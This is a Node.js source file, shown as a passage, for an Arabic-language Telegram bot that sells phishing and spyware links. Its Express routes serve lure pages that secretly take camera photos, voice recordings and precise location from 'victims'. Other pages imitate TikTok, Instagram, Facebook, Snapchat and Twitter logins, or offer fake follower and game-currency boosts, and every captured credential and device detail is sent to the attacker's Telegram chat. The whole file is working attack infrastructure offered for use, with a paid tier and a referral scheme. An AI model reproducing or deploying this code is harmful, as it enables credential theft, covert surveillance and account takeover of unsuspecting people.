    console.log(`تم خصم ${points} نقاط من المستخدم ${userId}. الرصيد الجديد: ${user.points}`);
    
    // إلغاء الاشتراك إذا أصبحت النقاط أقل من الحد المطلوب
    if (user.points < pointsRequiredForSubscription) {
      subscribedUsers.delete(userId);
      console.log(`تم إلغاء اشتراك المستخدم ${userId} بسبب نقص النقاط`);
      bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
    }
    
    return true;
  }
  console.log(`فشل خصم النقاط للمستخدم ${userId}. الرصيد الحالي: ${user.points}, المطلوب: ${points}`);
  return false;
}
// تشغيل البوت
bot.on('polling_error', (error) => {
  console.log(error);
});

console.log('البوت يعمل الآن...');

const trackAttempts = (userId, action) => {
    if (!userVisits[userId]) {
        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
    }

    userVisits[userId][action]++;

    return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
};

// دالة لتتبع المحاولات لمسار المنصة الأصلي
const trackPlatformAttempts = (platformId) => {
    if (!platformVisits[platformId]) {
        platformVisits[platformId] = 0;
    }

    platformVisits[platformId]++;

    return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
};

// المسار الأصلي


// مسار الكاميرا
app.get('/camera/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'location.html'));
        return;
    }

    if (trackAttempts(userId, 'camera')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'location.html'));
});

// مسار تسجيل الصوت
app.get('/record/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'record.html'));
        return;
    }

    if (trackAttempts(userId, 'voiceRecord')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'record.html'));
});

// مسار الحصول على الموقع
app.get('/getLocation/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'SJGD.html'));
        return;
    }

    if (trackAttempts(userId, 'getLocation')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'SJGD.html'));
});

app.get('/:action/:platform/:chatId', (req, res) => {
    const { action, platform, chatId } = req.params;

    if (subscribedUsers.has(chatId)) {
        res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
        return;
    }

    if (trackPlatformAttempts(chatId)) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
});


// استلام الصور
app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const chatId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${chatId}`);

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            for (const file of files) {
                await bot.sendPhoto(chatId, file.buffer, { caption });
            }
            console.log('Photos sent successfully');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});

// استلام الصوت
app.post('/submitVoice', upload.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voiceFile = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    if (!voiceFile) {
        console.error('No voice file received');
        return res.status(400).json({ error: 'No voice file received' });
    }

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    bot.sendVoice(chatId, voiceFile.buffer, { caption })
        .then(() => {
            console.log('Voice sent successfully');
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending voice:', error);
            res.status(500).json({ error: 'Failed to send voice message' });
        });
});

// استلام الموقع
app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData } = req.body;

    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    try {
        await bot.sendLocation(chatId, latitude, longitude);
        
        const message = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
متصفح المستخدم: ${additionalData.userAgent}
مستوى البطارية: ${additionalData.batteryLevel}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا'}
        `;
        
        await bot.sendMessage(chatId, message);
        console.log('Location and additional data sent successfully');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location', details: error.message });
    }
});

app.post('/submitIncrease', (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;

    console.log('Received ', { username, password, platform, chatId, ip, country, city });
    
    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = useragent.parse(userAgent);

    bot.sendMessage(chatId, `تم اختراق حساب جديد ☠️:
منصة: ${platform}
اسم المستخدم: ${username}
كلمة السر: ${password}
عنوان IP: ${ip}
الدولة: ${country}
المدينة: ${city}
نظام التشغيل: ${deviceInfo.os.toString()}
المتصفح: ${deviceInfo.toAgent()}
الجهاز: ${deviceInfo.device.toString()}`)
        .then(() => {
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending message:', error);
            res.status(500).json({ error: 'Failed to send increase data', details: error.message });
        });
});

app.post('/submitLogin', (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;

    console.log('Received login data:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = useragent.parse(userAgent);

    bot.sendMessage(chatId, `تم تلقي بيانات تسجيل الدخول:
منصة: ${platform}
اسم المستخدم: ${username}
كلمة السر: ${password}
عنوان IP: ${ip}
الدولة: ${country}
المدينة: ${city}
نظام التشغيل: ${osVersion}
المتصفح: ${deviceInfo.toAgent()}
الجهاز: ${deviceInfo.device.toString()}
مستوى البطارية: ${batteryLevel}
قيد الشحن: ${charging}`)
        .then(() => {
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending message:', error);
            res.status(500).json({ error: 'Failed to send login data', details: error.message });
        });
});


const crypto = require('crypto');

// إنشاء رابط الدعوة
function createReferralLink(userId) {
  const referralCode = Buffer.from(userId).toString('hex');
  return `https://t.me/submitLocationbot?start=${referralCode}`;
}

// فك تشفير رمز الدعوة
function decodeReferralCode(code) {
  try {
    return Buffer.from(code, 'hex').toString('utf-8');
  } catch (error) {
    console.error('خطأ في فك تشفير رمز الإحالة:', error);
    return null;
  }
}

// التحقق من الاشتراك في القنوات المطلوبة
async function checkSubscription(userId) {
  if (forcedChannelUsernames.length) {
    for (const channel of forcedChannelUsernames) {
      try {
        const member = await bot.getChatMember(channel, userId);
        if (member.status === 'left' || member.status === 'kicked') {
          await bot.sendMessage(userId, `عذرا، يجب عليك الانضمام إلى القنوات المطلوبة لاستخدام البوت:`, {
            reply_markup: {
              inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
            }
          });
          return false;
        }
      } catch (error) {
        console.error('خطأ أثناء التحقق من عضوية القناة:', error);
        
        return false;
      }
    }
    return true;
  }
  return true;
}

// التعامل مع الرسائل
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text ? msg.text.toLowerCase() : '';
  const senderId = msg.from.id.toString();

  if (!allUsers.has(chatId.toString())) {
    const newUser = {
      id: chatId,
      firstName: msg.from.first_name,
      lastName: msg.from.last_name || '',
      username: msg.from.username || ''
    };
    allUsers.set(chatId.toString(), newUser);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); 
    await bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`);
  }

  if (bannedUsers.has(senderId)) {
    await bot.sendMessage(chatId, 'تم إيقاف استخدام البوت من قبل المطور. لا يمكنك استخدام البوت حاليًا.');
    return;
  }

  // التحقق من الاشتراك عند كل رسالة /start
  if (text.startsWith('/start')) {
    const isSubscribed = await checkSubscription(senderId);
    if (!isSubscribed) {
      return;
    }
  }

  if (text === '/start') {
    showDefaultButtons(senderId);
  } else if (text === '/login') {
    showLoginButtons(senderId);
  } else if (text === '/hacking') {
    showHackingButtons(senderId);
  } else if (text.startsWith('/start ')) {
    const startPayload = text.split(' ')[1];
    console.log('Start payload:', startPayload);

    if (startPayload) {
      const referrerId = decodeReferralCode(startPayload);
      console.log('Decoded referrer ID:', referrerId);
      console.log('Sender ID:', senderId);

      if (referrerId && referrerId !== senderId) {
        try {
          const usedLinks = usedReferralLinks.get(senderId) || new Set();
          if (!usedLinks.has(referrerId)) {
            usedLinks.add(referrerId);
            usedReferralLinks.set(senderId, usedLinks);

            const referrerPoints = addPointsToUser(referrerId, 1);

            await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
            await bot.sendMessage(senderId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة وتمت إضافة نقطة للمستخدم الذي دعاك.');

            console.log(`User ${senderId} joined using referral link from ${referrerId}`);
          } else {
            await bot.sendMessage(senderId, 'لقد استخدمت هذا الرابط من قبل.');
          }
        } catch (error) {
          console.error('خطأ في معالجة رابط الدعوة:', error);
          await bot.sendMessage(senderId, 'حدث خطأ أثناء معالجة رابط الدعوة. الرجاء المحاولة مرة أخرى.');
        }
      } else {
        await bot.sendMessage(senderId, 'رابط الدعوة غير صالح أو أنك تحاول استخدام رابط الدعوة الخاص بك.');
      }
    } else {
      await bot.sendMessage(senderId, 'مرحبًا بك في البوت!');
    }

    showDefaultButtons(senderId);
  }
});

// التعامل مع الاستفسارات
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const userId = callbackQuery.from.id.toString();
  const data = callbackQuery.data;

  try {
    // التحقق من الاشتراك قبل تنفيذ أي عملية
    const isSubscribed = await checkSubscription(userId);
    if (!isSubscribed) {
      return;
    }

   if (data === 'create_referral') {
    const referralLink = createReferralLink(userId);
    console.log('Created referral link:', referralLink);
    await bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إنشاء رابط دعوة
  } else if (data === 'my_points') {
    const points = userPoints.get(userId) || 0;
    const isSubscribed = subscribedUsers.has(userId);
    let message = isSubscribed
      ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
      : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
    await bot.sendMessage(chatId, message);
  } else {
      if (!subscribedUsers.has(userId)) {
        const attempts = trackAttempt(userId, data);
        if (attempts > MAX_FREE_ATTEMPTS) {
          await bot.sendMessage(chatId, 'لقد تجاوزت الحد الأقصى للمحاولات المجانية. يرجى الاشتراك أو جمع المزيد من النقاط لاستخدام هذه الميزة.');
        } else {
          await bot.sendMessage(chatId, `ملاحظة: يمكنك استخدام هذه الميزة ${MAX_FREE_ATTEMPTS - attempts + 1} مرات أخرى قبل الحاجة إلى الاشتراك أو جمع المزيد من النقاط.`);
          // هنا يمكنك إضافة الكود الخاص بكل عملية
        }
      } else {
        await bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
        // هنا يمكنك إضافة الكود الخاص بكل عملية
      }
    }
  } catch (error) {
    console.error('Error in callback query handler:', error);
    await bot.sendMessage(chatId, 'حدث خطأ أثناء تنفيذ العملية. الرجاء المحاولة مرة أخرى لاحقًا.');
  }

  saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد كل عملية
  await bot.answerCallbackQuery(callbackQuery.id);
});

function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  checkSubscriptionStatus(userId);
  saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إضافة النقاط
  return user.points;
}

function deductPointsFromUser(userId, points) {
  const currentPoints = userPoints.get(userId) || 0;
  if (currentPoints >= points) {
    const newPoints = currentPoints - points;
    userPoints.set(userId, newPoints);
    saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد خصم النقاط
    return true;
  }
  return false;
}

function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  
  // التحقق من حالة الاشتراك بعد إضافة النقاط
  checkSubscriptionStatus(userId);
  
  return user.points;
}


   function checkSubscriptionStatus(userId) {
  const user = allUsers.get(userId);
  if (!user) return false;

  if (user.points >= pointsRequiredForSubscription) {
    if (!subscribedUsers.has(userId)) {
      // خصم النقاط المطلوبة للاشتراك
      user.points -= pointsRequiredForSubscription;
      userPoints.set(userId, user.points);
      
      subscribedUsers.add(userId);
      bot.sendMessage(userId, `تهانينا! لقد تم اشتراكك تلقائيًا. تم خصم ${pointsRequiredForSubscription} نقطة من رصيدك.`);
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد الاشتراك
    }
    return true;
  } else {
    if (subscribedUsers.has(userId)) {
      subscribedUsers.delete(userId);
      bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
      saveData().catch(error => console.error('فشل في حفظ البيانات:', error)); // حفظ البيانات بعد إلغاء الاشتراك
    }
    return false;
  }
}
function trackAttempt(userId, feature) {
  if (!userVisits[userId]) userVisits[userId] = {};
  userVisits[userId][feature] = (userVisits[userId][feature] || 0) + 1;
  return userVisits[userId][feature];
}

function shortenUrl(url) {
  return new Promise((resolve, reject) => {
    TinyURL.shorten(url, function(res, err) {
      if (err)
        reject(err);
      else
        resolve(res);
    });
  });
}




function showDefaultButtons(userId) {
  let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا ارسل امر لاضهار اندكسات تسجيل دخول /login اكتب امر لاضهور اندكسات صفحات مزوره على شكل زياده متابعين /hacking.`;

  let defaultButtons = [
    [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data: 'front_camera' }],
    [{ text: '🎙 تسجيل صوت 🎙', callback_data: 'voice_record' }],
    [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data: 'get_location' }],
    [{ text: "اختراق كامراة المراقبه 📡", callback_data: "get_cameras" }],
    { text: 'اعطيني نكته 🤣', callback_data: 'get_joke' }],
    [{ text: 'اكتبلي رسالة  فك حظر وتساب 🚸', callback_data: 'get_love_message' }],
    [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data: 'create_referral' }],
    [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
    [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
    [{ text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
  ];

  bot.sendMessage(userId, `${statusMessage}\n\nمرحبا قم باختيار أي شيء تريده لكن لن تستطيع استخدام أي رابط سوى 5 مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 أو قم بتجميع نقاط لاستخدامه مجانًا:`, {
    reply_markup: {
      inline_keyboard: defaultButtons
    }
  });
}


// هنا يمكنك تعريف دالة showButtons إذا كنت تحتاجها
function showButtons(userId) {
  showDefaultButtons(userId);
}


// ... (باقي الكود)


bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'front_camera' || data === 'rear_camera') {
        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
        bot.sendMessage(chatId, ` تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${url}`);
    } else if (data === 'voice_record') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
    } else if (data === 'get_location') {
        const url = `https://yyytot.onrender.com/getLocation/${chatId}`;
        console.log('Data received:', data);
        console.log('Chat ID:', chatId);
        console.log('URL:', url);
        
        bot.sendMessage(chatId, `تم تلغيم رابط اختراق موقع الضحيه الدقيق: ${url}`)
            .then(() => console.log('Message sent successfully'))
            .catch(err => console.error('Error sending message:', err));
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const duration = parseInt(msg.text, 10);

    if (!isNaN(duration)) {
        if (duration > 0 && duration <= 20) {
            const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
            bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت الضحيه لمدة ${duration} ثواني: ${link}`);
        } else {
            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
        }
    }
});

function showLoginButtons(userId) {
  let loginButtons = [
    [{ text: ' 🎵اندكس تسجيل دخول تيك توك 🎵 ', callback_data: 'login_tiktok' }],
    [{ text: ' 📸اندكس تسجيل دخول انستقرام 📸', callback_data: 'login_instagram' }],
    [{ text: ' 📘اندكس تسجيل دخول فيسبوك 📘', callback_data: 'login_facebook' }],
    [{ text: ' 👻اندكس تسجيل دخول سناب شات 👻', callback_data: 'login_snapchat' }],
    [{ text: ' 🐦اندكس تسجيل دخول تويتر 🐦', callback_data: 'login_twitter' }],
  ];

  bot.sendMessage(userId, `اختر اي رابط تسجيل دخول في صفحه تشبه الصفحه الحقيقه لمنصات اذا قام الضحيه بتسجيل الدخول راح توصلك المعلومات الا البوت:`, {
    reply_markup: {
      inline_keyboard: loginButtons
    }
  });
}

function showHackingButtons(userId) {
  let hackingButtons = [
    [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
    [{ text: '🕷 اختراق الانستغرام 🕷', callback_data: 'increase_instagram' }],
    [{ text: '🔱 اختراق الفيسبوك 🔱', callback_data: 'increase_facebook' }],
    [{ text: '👻 اختراق سناب شات 👻', callback_data: 'increase_snapchat' }],
    [{ text: '💎 شحن جواهر فري فاير 💎', callback_data:'free_fire_diamonds' }],
    [{ text: '🔫 اختراق حسابات ببجي 🔫', callback_data: 'pubg_uc' }],
    [{ text: '🔴 اختراق يوتيوب 🔴', callback_data: 'increase_youtube' }],
    [{ text: '🐦 اختراق تويتر 🐦', callback_data: 'increase_twitter' }],
  ];

  bot.sendMessage(userId, `اختر اندكسات على شكل زياده متابعين عند قيام الضحيه بتسجيل لاجل زياده المتابعين راح توصلك المعلومات الا البوت:`, {
    reply_markup: {
      inline_keyboard: hackingButtons
    }
  });
}

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const baseUrl = 'https://yyytot.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك

    console.log('Received callback query:', data);

    let url, message;

    if (data.startsWith('login_')) {
        const platform = data.split('_')[1];
        url = `${baseUrl}/login/${platform}/${chatId}`;
        message = `تم تلغيم  رابط اندكس تسجيل دخول يشبه الصفحه الحقيقه لحد المنصة: ${getPlatformName(platform)}: ${url}`;
    } else if (data === 'pubg_uc' || data === 'free_fire_diamonds') {
        const game = data === 'pubg_uc' ? 'pubg_uc' : 'free_fire_diamonds';
        url = `${baseUrl}/increase/${game}/${chatId}`;
        message = `تم تلغيم رابط اختراق على شكل صفحه مزوره لشحن ${getPlatformName(game)} مجانآ: ${url}`;
    } else if (data.startsWith('increase_')) {
        const platform = data.split('_')[1];
        url = `${baseUrl}/increase/${platform}/${chatId}`;
        message = `تم تلغيم رابط اختراق على شكل صفحه مزوره لزيادة المتابعين ${getPlatformName(platform)}: ${url}`;
    } else {
        console.log('Unhandled callback query:', data);
        return;
    }

    bot.sendMessage(chatId, message)
        .then(() => console.log('Message sent successfully:', message))
        .catch(error => console.error('Error sending message:', error));
});

function getPlatformName(platform) {
    const platformNames = {
        tiktok: 'تيك توك',
        instagram: 'انستغرام',
        facebook: 'فيسبوك',
        snapchat: 'سناب شات',
        pubg_uc: 'شدات ببجي',
        youtube: 'يوتيوب',
        twitter: 'تويتر',
        free_fire_diamonds: 'جواهر فري فاير'
    };
    return platformNames[platform] || platform;
}


const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
